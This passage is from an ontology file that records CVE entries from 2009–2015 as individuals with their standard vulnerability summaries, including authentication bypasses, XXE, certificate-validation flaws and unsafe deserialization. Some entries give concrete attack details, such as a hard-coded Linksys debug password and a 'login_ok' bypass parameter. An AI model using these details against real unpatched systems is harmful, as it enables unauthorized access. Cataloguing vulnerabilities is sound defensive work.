        rdfs:comment "The example code for the digest authentication functionality (http_authentication.rb) in Ruby on Rails before 2.3.3 defines an authenticate_or_request_with_http_digest block that returns nil instead of false when the user does not exist, which allows context-dependent attackers to bypass authentication for applications that are derived from this example by sending an invalid username without a password."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2009-2540

    Annotations: 
        rdfs:comment "Opera, possibly 9.64 and earlier, allows remote attackers to cause a denial of service (memory consumption) via a large integer value for the length property of a Select object, a related issue to CVE-2009-1692."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2009-2726

    Annotations: 
        rdfs:comment "The SIP channel driver in Asterisk Open Source 1.2.x before 1.2.34, 1.4.x before 1.4.26.1, 1.6.0.x before 1.6.0.12, and 1.6.1.x before 1.6.1.4; Asterisk Business Edition A.x.x, B.x.x before B.2.5.9, C.2.x before C.2.4.1, and C.3.x before C.3.1; and Asterisk Appliance s800i 1.2.x before 1.3.0.3 does not use a maximum width when invoking sscanf style functions, which allows remote attackers to cause a denial of service (stack memory consumption) via SIP packets containing large sequences of ASCII decimal characters, as demonstrated via vectors related to (1) the CSeq value in a SIP header, (2) large Content-Length value, and (3) SDP."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2009-2960

    Annotations: 
        rdfs:comment "CuteFlow 2.10.3 and 2.11.0_c does not properly restrict access to pages/edituser.php, which allows remote attackers to modify usernames and passwords via a direct request."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2009-3022

    Annotations: 
        rdfs:comment "Cross-site request forgery (CSRF) vulnerability in bingo!CMS 1.2 and earlier allows remote attackers to hijack the authentication of other users for requests that modify configuration or change content via unspecified vectors."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2009-3046

    Annotations: 
        rdfs:comment "Opera before 10.00 does not check all intermediate X.509 certificates for revocation, which makes it easier for remote SSL servers to bypass validation of the certificate chain via a revoked certificate."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2009-3107

    Annotations: 
        rdfs:comment "Symantec Altiris Deployment Solution 6.9.x before 6.9 SP3 Build 430 does not properly restrict access to the listening port for the DBManager service, which allows remote attackers to bypass authentication and modify tasks or the Altiris Database via a connection to this service."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2009-3168

    Annotations: 
        rdfs:comment "Mevin Productions Basic PHP Events Lister 2.0 does not properly restrict access to (1) admin/reset.php and (2) admin/user_add.php, which allows remote authenticated users to reset administrative passwords or add administrators via a direct request."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2009-3230

    Annotations: 
        rdfs:comment "The core server component in PostgreSQL 8.4 before 8.4.1, 8.3 before 8.3.8, 8.2 before 8.2.14, 8.1 before 8.1.18, 8.0 before 8.0.22, and 7.4 before 7.4.26 does not use the appropriate privileges for the (1) RESET ROLE and (2) RESET SESSION AUTHORIZATION operations, which allows remote authenticated users to gain privileges. NOTE: this is due to an incomplete fix for CVE-2007-6600."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2009-3231

    Annotations: 
        rdfs:comment "The core server component in PostgreSQL 8.3 before 8.3.8 and 8.2 before 8.2.14, when using LDAP authentication with anonymous binds, allows remote attackers to bypass authentication via an empty password."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2009-3232

    Annotations: 
        rdfs:comment "pam-auth-update for PAM, as used in Ubuntu 8.10 and 9.4, and Debian GNU/Linux, does not properly handle an \"empty selection\" for system authentication modules in certain rare configurations, which causes any attempt to be successful and allows remote attackers to bypass authentication."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2009-3238

    Annotations: 
        rdfs:comment "The get_random_int function in drivers/char/random.c in the Linux kernel before 2.6.30 produces insufficiently random numbers, which allows attackers to predict the return value, and possibly defeat protection mechanisms based on randomization, via vectors that leverage the function's tendency to \"return the same value over and over again for long stretches of time.\""^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2009-3278

    Annotations: 
        rdfs:comment "The QNAP TS-239 Pro and TS-639 Pro with firmware 2.1.7 0613, 3.1.0 0627, and 3.1.1 0815 use the rand library function to generate a certain recovery key, which makes it easier for local users to determine this key via a brute-force attack."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2009-3289

    Annotations: 
        rdfs:comment "The g_file_copy function in glib 2.0 sets the permissions of a target file to the permissions of a symbolic link (777), which allows user-assisted local users to modify files of other users, as demonstrated by using Nautilus to modify the permissions of the user home directory."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2009-3421

    Annotations: 
        rdfs:comment "login script for guestbook allows bypassing authentication by setting a \"login_ok\" parameter to 1."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2009-3482

    Annotations: 
        rdfs:comment "TrustPort Antivirus before 2.8.0.2266 and PC Security before 2.0.0.1291 use weak permissions (Everyone: Full Control) for files under %PROGRAMFILES%, which allows local users to gain privileges by replacing executables with Trojan horse programs."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2009-3489

    Annotations: 
        rdfs:comment "Adobe Photoshop Elements 8.0 installs the Adobe Active File Monitor V8 service with an insecure security descriptor, which allows local users to (1) stop the service via the stop command, (2) execute arbitrary commands as SYSTEM by using the config command to modify the binPath variable, or (3) restart the service via the start command."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2009-3520

    Annotations: 
        rdfs:comment "Cross-site request forgery (CSRF) vulnerability in the Your_account module in CMSphp 0.21 allows remote attackers to hijack the authentication of administrators for requests that change an administrator password via the pseudo, pwd, and uid parameters in an admin_info_user_verif action."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2009-3597

    Annotations: 
        rdfs:comment "Digitaldesign CMS 0.1 stores sensitive information under the web root with insufficient access control, which allows remote attackers to download the database file via a direct request for autoconfig.dd."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2009-3611

    Annotations: 
        rdfs:comment "common/snapshots.py in Back In Time (aka backintime) 0.9.26 changes certain permissions to 0777 before deleting the files in an old backup snapshot, which allows local users to obtain sensitive information by reading these files, or interfere with backup integrity by modifying files that are shared across snapshots."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2009-3759

    Annotations: 
        rdfs:comment "Multiple cross-site request forgery (CSRF) vulnerabilities in sample code in the XenServer Resource Kit in Citrix XenCenterWeb allow remote attackers to hijack the authentication of administrators for (1) requests that change the password via the username parameter to config/changepw.php or (2) stop a virtual machine via the stop_vmname parameter to hardstopvm.php. NOTE: some of these details are obtained from third party information."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2009-3767

    Annotations: 
        rdfs:comment "libraries/libldap/tls_o.c in OpenLDAP 2.2 and 2.4, and possibly other versions, when OpenSSL is used, does not properly handle a '\\0' character in a domain name in the subject's Common Name (CN) field of an X.509 certificate, which allows man-in-the-middle attackers to spoof arbitrary SSL servers via a crafted certificate issued by a legitimate Certification Authority, a related issue to CVE-2009-2408."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2009-3781

    Annotations: 
        rdfs:comment "The filefield_file_download function in FileField 6.x-3.1, a module for Drupal, does not properly check node-access permissions for Drupal core private files, which allows remote attackers to access unauthorized files via unspecified vectors."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2009-3897

    Annotations: 
        rdfs:comment "Dovecot 1.2.x before 1.2.8 sets 0777 permissions during creation of certain directories at installation time, which allows local users to access arbitrary user accounts by replacing the auth socket, related to the parent directories of the base_dir directory, and possibly the base_dir directory itself."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2009-3939

    Annotations: 
        rdfs:comment "The poll_mode_io file for the megaraid_sas driver in the Linux kernel 2.6.31.6 and earlier has world-writable permissions, which allows local users to change the I/O mode of the driver by modifying this file."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2009-4017

    Annotations: 
        rdfs:comment "PHP before 5.2.12 and 5.3.x before 5.3.1 does not restrict the number of temporary files created when handling a multipart/form-data POST request, which allows remote attackers to cause a denial of service (resource exhaustion), and makes it easier for remote attackers to exploit local file inclusion vulnerabilities, via multiple requests, related to lack of support for the max_file_uploads directive."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2009-4565

    Annotations: 
        rdfs:comment "sendmail before 8.14.4 does not properly handle a '\\0' character in a Common Name (CN) field of an X.509 certificate, which (1) allows man-in-the-middle attackers to spoof arbitrary SSL-based SMTP servers via a crafted server certificate issued by a legitimate Certification Authority, and (2) allows remote attackers to bypass intended access restrictions via a crafted client certificate issued by a legitimate Certification Authority, a related issue to CVE-2009-2408."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2009-5056

    Annotations: 
        rdfs:comment "Open Ticket Request System (OTRS) before 2.4.0-beta2 does not properly enforce the move_into permission setting for a queue, which allows remote authenticated users to bypass intended access restrictions and read a ticket by watching this ticket, and then selecting the ticket from the watched-tickets list."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2010-1378

    Annotations: 
        rdfs:comment "OpenSSL in Apple Mac OS X 10.6.x before 10.6.5 does not properly perform arithmetic, which allows remote attackers to bypass X.509 certificate authentication via an arbitrary certificate issued by a legitimate Certification Authority."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2010-1573

    Annotations: 
        rdfs:comment "Linksys WAP54Gv3 firmware 3.04.03 and earlier uses a hard-coded username (Gemtek) and password (gemtekswd) for a debug interface for certain web pages, which allows remote attackers to execute arbitrary commands via the (1) data1, (2) data2, or (3) data3 parameters to (a) Debug_command_page.asp and (b) debug.cgi."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2010-1637

    Annotations: 
        rdfs:comment "The Mail Fetch plugin in SquirrelMail 1.4.20 and earlier allows remote authenticated users to bypass firewall restrictions and use SquirrelMail as a proxy to scan internal networks via a modified POP3 port number."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2010-2073

    Annotations: 
        rdfs:comment "auth_db_config.py in Pyftpd 0.8.4 contains hard-coded usernames and passwords for the (1) test, (2) user, and (3) roxon accounts, which allows remote attackers to read arbitrary files from the FTP server."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2010-2074

    Annotations: 
        rdfs:comment "istream.c in w3m 0.5.2 and possibly other versions, when ssl_verify_server is enabled, does not properly handle a '\\0' character in a domain name in the (1) subject's Common Name or (2) Subject Alternative Name field of an X.509 certificate, which allows man-in-the-middle attackers to spoof arbitrary SSL servers via a crafted certificate issued by a legitimate Certification Authority, a related issue to CVE-2009-2408."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2010-2076

    Annotations: 
        rdfs:comment "Apache CXF 2.0.x before 2.0.13, 2.1.x before 2.1.10, and 2.2.x before 2.2.9, as used in Apache ServiceMix, Apache Camel, Apache Chemistry, Apache jUDDI, Apache Geronimo, and other products, does not properly reject DTDs in SOAP messages, which allows remote attackers to read arbitrary files, send HTTP requests to intranet servers, or cause a denial of service (CPU and memory consumption) via a crafted DTD, as demonstrated by an entity declaration in a request to samples/wsdl_first_pure_xml, a similar issue to CVE-2010-1632."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2010-2620

    Annotations: 
        rdfs:comment "Open&Compact FTP Server (Open-FTPD) 1.2 and earlier allows remote attackers to bypass authentication by sending (1) LIST, (2) RETR, (3) STOR, or other commands without performing the required login steps first."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2010-2772

    Annotations: 
        rdfs:comment "Siemens Simatic WinCC and PCS 7 SCADA system uses a hard-coded password, which allows local users to access a back-end database and gain privileges, as demonstrated in the wild in July 2010 by the Stuxnet worm, a different vulnerability than CVE-2010-2568."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2010-3322

    Annotations: 
        rdfs:comment "The XML parser in Splunk 4.0.0 through 4.1.4 allows remote authenticated users to obtain sensitive information and gain privileges via an XML External Entity (XXE) attack to unknown vectors."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2010-3636

    Annotations: 
        rdfs:comment "Adobe Flash Player before 9.0.289.0 and 10.x before 10.1.102.64 on Windows, Mac OS X, Linux, and Solaris, and 10.1.95.1 on Android, does not properly handle unspecified encodings during the parsing of a cross-domain policy file, which allows remote web servers to bypass intended access restrictions via unknown vectors."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2010-4624

    Annotations: 
        rdfs:comment "MyBB (aka MyBulletinBoard) before 1.4.12 allows remote authenticated users to bypass intended restrictions on the number of [img] MyCodes by editing a post after it has been created."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2010-5185

    Annotations: 
        rdfs:comment "The Antivirus component in Comodo Internet Security before 5.3.174622.1216 does not check whether X.509 certificates in signed executable files have been revoked, which has unknown impact and remote attack vectors."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2011-0199

    Annotations: 
        rdfs:comment "The Certificate Trust Policy component in Apple Mac OS X before 10.6.8 does not perform CRL checking for Extended Validation (EV) certificates that lack OCSP URLs, which might allow man-in-the-middle attackers to spoof an SSL server via a revoked certificate."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2011-0348

    Annotations: 
        rdfs:comment "Cisco IOS 12.4(11)MD, 12.4(15)MD, 12.4(22)MD, 12.4(24)MD before 12.4(24)MD3, 12.4(22)MDA before 12.4(22)MDA5, and 12.4(24)MDA before 12.4(24)MDA3 on the Cisco Content Services Gateway Second Generation (aka CSG2) allows remote attackers to bypass intended access restrictions and intended billing restrictions by sending HTTP traffic to a restricted destination after sending HTTP traffic to an unrestricted destination, aka Bug ID CSCtk35917."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2011-0935

    Annotations: 
        rdfs:comment "The PKI functionality in Cisco IOS 15.0 and 15.1 does not prevent permanent caching of certain public keys, which allows remote attackers to bypass authentication and have unspecified other impact by leveraging an IKE peer relationship in which a key was previously valid but later revoked, aka Bug ID CSCth82164, a different vulnerability than CVE-2010-4685."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2011-1551

    Annotations: 
        rdfs:comment "SUSE openSUSE Factory assigns ownership of the /var/log/cobbler/ directory tree to the web-service user account, which might allow local users to gain privileges by leveraging access to this account during root filesystem operations by the Cobbler daemon."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2011-2014

    Annotations: 
        rdfs:comment "The LDAP over SSL (aka LDAPS) implementation in Active Directory, Active Directory Application Mode (ADAM), and Active Directory Lightweight Directory Service (AD LDS) in Microsoft Windows XP SP2 and SP3, Windows Server 2003 SP2, Windows Vista SP2, Windows Server 2008 SP2, R2, and R2 SP1, and Windows 7 Gold and SP1 does not examine Certificate Revocation Lists (CRLs), which allows remote authenticated users to bypass intended certificate restrictions and access Active Directory resources by leveraging a revoked X.509 certificate for a domain account, aka \"LDAPS Authentication Bypass Vulnerability.\""^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2011-2520

    Annotations: 
        rdfs:comment "fw_dbus.py in system-config-firewall 1.2.29 and earlier uses the pickle Python module unsafely during D-Bus communication between the GUI and the backend, which might allow local users to gain privileges via a crafted serialized object."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2011-2701

    Annotations: 
        rdfs:comment "The ocsp_check function in rlm_eap_tls.c in FreeRADIUS 2.1.11, when OCSP is enabled, does not properly parse replies from OCSP responders, which allows remote attackers to bypass authentication by using the EAP-TLS protocol with a revoked X.509 client certificate."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2011-4107

    Annotations: 
        rdfs:comment "The simplexml_load_string function in the XML import plug-in (libraries/import/xml.php) in phpMyAdmin 3.4.x before 3.4.7.1 and 3.3.x before 3.3.10.5 allows remote authenticated users to read arbitrary files via XML data containing external entity references, aka an XML external entity (XXE) injection attack."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2012-0037

    Annotations: 
        rdfs:comment "Redland Raptor (aka libraptor) before 2.0.7, as used by OpenOffice 3.3 and 3.4 Beta, LibreOffice before 3.4.6 and 3.5.x before 3.5.1, and other products, allows user-assisted remote attackers to read arbitrary files via a crafted XML external entity (XXE) declaration and reference in an RDF document."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2012-0867

    Annotations: 
        rdfs:comment "PostgreSQL 8.4.x before 8.4.11, 9.0.x before 9.0.7, and 9.1.x before 9.1.3 truncates the common name to only 32 characters when verifying SSL certificates, which allows remote attackers to spoof connections when the host name is exactly 32 characters."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2012-0911

    Annotations: 
        rdfs:comment "TikiWiki CMS/Groupware before 6.7 LTS and before 8.4 allows remote attackers to execute arbitrary PHP code via a crafted serialized object in the (1) cookieName to lib/banners/bannerlib.php; (2) printpages or (3) printstructures parameter to (a) tiki-print_multi_pages.php or (b) tiki-print_pages.php; or (4) sendpages, (5) sendstructures, or (6) sendarticles parameter to tiki-send_objects.php, which is not properly handled when processed by the unserialize function."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2012-1988

    Annotations: 
        rdfs:comment "Puppet 2.6.x before 2.6.15 and 2.7.x before 2.7.13, and Puppet Enterprise (PE) Users 1.0, 1.1, 1.2.x, 2.0.x, and 2.5.x before 2.5.1 allows remote authenticated users with agent SSL keys and file-creation permissions on the puppet master to execute arbitrary commands by creating a file whose full pathname contains shell metacharacters, then performing a filebucket request."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2012-2239

    Annotations: 
        rdfs:comment "Mahara 1.4.x before 1.4.4 and 1.5.x before 1.5.3 allows remote attackers to read arbitrary files or create TCP connections via an XML external entity (XXE) injection attack, as demonstrated by reading config.php."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2012-2292

    Annotations: 
        rdfs:comment "The Silverlight cross-domain policy in EMC RSA Archer SmartSuite Framework 4.x and RSA Archer GRC 5.x before 5.2SP1 does not restrict access to the Archer application, which allows remote attackers to bypass the Same Origin Policy via unspecified vectors."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2012-2993

    Annotations: 
        rdfs:comment "Microsoft Windows Phone 7 does not verify the domain name in the subject's Common Name (CN) field of an X.509 certificate, which allows man-in-the-middle attackers to spoof an SSL server for the (1) POP3, (2) IMAP, or (3) SMTP protocol via an arbitrary valid certificate."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2012-3363

    Annotations: 
        rdfs:comment "Zend_XmlRpc in Zend Framework 1.x before 1.11.12 and 1.12.x before 1.12.0 does not properly handle SimpleXMLElement classes, which allows remote attackers to read arbitrary files or create TCP connections via an external entity reference in a DOCTYPE element in an XML-RPC request, aka an XML external entity (XXE) injection attack."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2012-3446

    Annotations: 
        rdfs:comment "Apache Libcloud before 0.11.1 uses an incorrect regular expression during verification of whether the server hostname matches a domain name in the subject's Common Name (CN) or subjectAltName field of the X.509 certificate, which allows man-in-the-middle attackers to spoof SSL servers via a crafted certificate."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2012-3489

    Annotations: 
        rdfs:comment "The xml_parse function in the libxml2 support in the core server component in PostgreSQL 8.3 before 8.3.20, 8.4 before 8.4.13, 9.0 before 9.0.9, and 9.1 before 9.1.5 allows remote authenticated users to determine the existence of arbitrary files or URLs, and possibly obtain file or URL content that triggers a parsing error, via an XML value that refers to (1) a DTD or (2) an entity, related to an XML External Entity (aka XXE) issue."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2012-3527

    Annotations: 
        rdfs:comment "view_help.php in the backend help system in TYPO3 4.5.x before 4.5.19, 4.6.x before 4.6.12 and 4.7.x before 4.7.4 allows remote authenticated backend users to unserialize arbitrary objects and possibly execute arbitrary PHP code via an unspecified parameter, related to a \"missing signature (HMAC).\""^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2012-4399

    Annotations: 
        rdfs:comment "The Xml class in CakePHP 2.1.x before 2.1.5 and 2.2.x before 2.2.1 allows remote attackers to read arbitrary files via XML data containing external entity references, aka an XML external entity (XXE) injection attack."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2012-4406

    Annotations: 
        rdfs:comment "OpenStack Object Storage (swift) before 1.7.0 uses the loads function in the pickle Python module unsafely when storing and loading metadata in memcached, which allows remote attackers to execute arbitrary code via a crafted pickle object."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2012-5656

    Annotations: 
        rdfs:comment "The rasterization process in Inkscape before 0.48.4 allows local users to read arbitrary files via an external entity in a SVG file, aka an XML external entity (XXE) injection attack."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2012-5780

    Annotations: 
        rdfs:comment "The Amazon merchant SDK does not verify that the server hostname matches a domain name in the subject's Common Name (CN) or subjectAltName field of the X.509 certificate, which allows man-in-the-middle attackers to spoof SSL servers via an arbitrary valid certificate."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2012-5782

    Annotations: 
        rdfs:comment "Amazon Flexible Payments Service (FPS) PHP Library does not verify that the server hostname matches a domain name in the subject's Common Name (CN) or subjectAltName field of the X.509 certificate, which allows man-in-the-middle attackers to spoof SSL servers via an arbitrary valid certificate, related to misinterpretation of a certain \"true\" value."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2012-5784

    Annotations: 
        rdfs:comment "Apache Axis 1.4 and earlier, as used in PayPal Payments Pro, PayPal Mass Pay, PayPal Transactional Information SOAP, the Java Message Service implementation in Apache ActiveMQ, and other products, does not verify that the server hostname matches a domain name in the subject's Common Name (CN) or subjectAltName field of the X.509 certificate, which allows man-in-the-middle attackers to spoof SSL servers via an arbitrary valid certificate."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2012-5804

    Annotations: 
        rdfs:comment "The CyberSource module in Ubercart does not verify that the server hostname matches a domain name in the subject's Common Name (CN) or subjectAltName field of the X.509 certificate, which allows man-in-the-middle attackers to spoof SSL servers via an arbitrary valid certificate."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2012-5806

    Annotations: 
        rdfs:comment "The PayPal Payments Pro module in Zen Cart does not verify that the server hostname matches a domain name in the subject's Common Name (CN) or subjectAltName field of the X.509 certificate, which allows man-in-the-middle attackers to spoof SSL servers via an arbitrary valid certificate, related to use of the PHP fsockopen function, a different vulnerability than CVE-2012-5805."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2012-5807

    Annotations: 
        rdfs:comment "The Authorize.Net eCheck module in Zen Cart does not verify that the server hostname matches a domain name in the subject's Common Name (CN) or subjectAltName field of the X.509 certificate, which allows man-in-the-middle attackers to spoof SSL servers via an arbitrary valid certificate."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2012-5810

    Annotations: 
        rdfs:comment "The Chase mobile banking application for Android does not verify that the server hostname matches a domain name in the subject's Common Name (CN) or subjectAltName field of the X.509 certificate, which allows man-in-the-middle attackers to spoof SSL servers via an arbitrary valid certificate, related to overriding the default X509TrustManager. NOTE: this vulnerability was fixed in the summer of 2012, but the version number was not changed or is not known."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2012-5811

    Annotations: 
        rdfs:comment "The Breezy application for Android does not verify that the server hostname matches a domain name in the subject's Common Name (CN) or subjectAltName field of the X.509 certificate, which allows man-in-the-middle attackers to spoof SSL servers via an arbitrary valid certificate."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2012-5817

    Annotations: 
        rdfs:comment "Codehaus XFire 1.2.6 and earlier, as used in the Amazon EC2 API Tools Java library and other products, does not verify that the server hostname matches a domain name in the subject's Common Name (CN) or subjectAltName field of the X.509 certificate, which allows man-in-the-middle attackers to spoof SSL servers via an arbitrary valid certificate."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2012-5819

    Annotations: 
        rdfs:comment "FilesAnywhere does not verify that the server hostname matches a domain name in the subject's Common Name (CN) or subjectAltName field of the X.509 certificate, which allows man-in-the-middle attackers to spoof SSL servers via an arbitrary valid certificate."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2012-5821

    Annotations: 
        rdfs:comment "Lynx does not verify that the server's certificate is signed by a trusted certification authority, which allows man-in-the-middle attackers to spoof SSL servers via a crafted certificate, related to improper use of a certain GnuTLS function."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2012-5822

    Annotations: 
        rdfs:comment "The contribution feature in Zamboni does not verify that the server hostname matches a domain name in the subject's Common Name (CN) or subjectAltName field of the X.509 certificate, which allows man-in-the-middle attackers to spoof SSL servers via an arbitrary valid certificate, related to use of the Python urllib2 library."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2012-5824

    Annotations: 
        rdfs:comment "Trillian 5.1.0.19 does not verify that the server hostname matches a domain name in the subject's Common Name (CN) or subjectAltName field of the X.509 certificate, which allows man-in-the-middle attackers to spoof SSL servers via an arbitrary valid certificate, a different vulnerability than CVE-2009-4831."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2013-1465

    Annotations: 
        rdfs:comment "The Cubecart::_basket method in classes/cubecart.class.php in CubeCart 5.0.0 through 5.2.0 allows remote attackers to unserialize arbitrary PHP objects via a crafted shipping parameter, as demonstrated by modifying the application configuration using the Config object."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2013-5211

    Annotations: 
        rdfs:comment "The monlist feature in ntp_request.c in ntpd in NTP before 4.2.7p26 allows remote attackers to cause a denial of service (traffic amplification) via forged (1) REQ_MON_GETLIST or (2) REQ_MON_GETLIST_1 requests, as exploited in the wild in December 2013."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2013-5725

    Annotations: 
        rdfs:comment "The Metaclassy Byword app 2.x before 2.1 for iOS does not require confirmation of Replace file actions, which allows remote attackers to overwrite arbitrary files via the name and text parameters in a byword://replace URL."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2013-5726

    Annotations: 
        rdfs:comment "Tweetbot 1.3.3 for Mac, and 2.8.5 for iPad and iPhone, does not require confirmation of (1) follow or (2) favorite actions, which allows remote attackers to automatically force the user to perform undesired actions, as demonstrated via the tweetbot:///follow/ URL."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2014-1266

    Annotations: 
        rdfs:comment "The SSLVerifySignedServerKeyExchange function in libsecurity_ssl/lib/sslKeyExchange.c in the Secure Transport feature in the Data Security component in Apple iOS 6.x before 6.1.6 and 7.x before 7.0.6, Apple TV 6.x before 6.0.2, and Apple OS X 10.9.x before 10.9.2 does not check the signature in a TLS Server Key Exchange message, which allows man-in-the-middle attackers to spoof SSL servers by (1) using an arbitrary private key for the signing step or (2) omitting the signing step."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2014-2049

    Annotations: 
        rdfs:comment "The default Flash Cross Domain policies in ownCloud before 5.0.15 and 6.x before 6.0.2 allows remote attackers to access user files via unspecified vectors."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2014-2503

    Annotations: 
        rdfs:comment "The thumbnail proxy server in EMC Documentum Digital Asset Manager (DAM) 6.5 SP3, 6.5 SP4, 6.5 SP5, and 6.5 SP6 before P13 allows remote attackers to conduct Documentum Query Language (DQL) injection attacks and bypass intended restrictions on querying objects via a crafted parameter in a query string."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2014-2508

    Annotations: 
        rdfs:comment "EMC Documentum Content Server before 6.7 SP1 P28, 6.7 SP2 before P14, 7.0 before P15, and 7.1 before P05 allows remote authenticated users to conduct Documentum Query Language (DQL) injection attacks and bypass intended restrictions on database actions via vectors involving DQL hints."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2014-5198

    Annotations: 
        rdfs:comment "Cross-site scripting (XSS) vulnerability in Splunk Web in Splunk Enterprise 6.1.x before 6.1.3 allows remote attackers to inject arbitrary web script or HTML via the Referer HTTP header."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2014-8958

    Annotations: 
        rdfs:comment "Multiple cross-site scripting (XSS) vulnerabilities in phpMyAdmin 4.0.x before 4.0.10.6, 4.1.x before 4.1.14.7, and 4.2.x before 4.2.12 allow remote authenticated users to inject arbitrary web script or HTML via a crafted (1) database, (2) table, or (3) column name that is improperly handled during rendering of the table browse page; a crafted ENUM value that is improperly handled during rendering of the (4) table print view or (5) zoom search page; or (6) a crafted pma_fontsize cookie that is improperly handled during rendering of the home page."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2015-4852

    Annotations: 
        rdfs:comment "The WLS Security component in Oracle WebLogic Server 10.3.6.0, 12.1.2.0, 12.1.3.0, and 12.2.1.0 allows remote attackers to execute arbitrary commands via a crafted serialized Java object in T3 protocol traffic to TCP port 7001, related to oracle_common/modules/com.bea.core.apache.commons.collections.jar. NOTE: the scope of this CVE is limited to the WebLogic Server product."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2015-8103

    Annotations: 
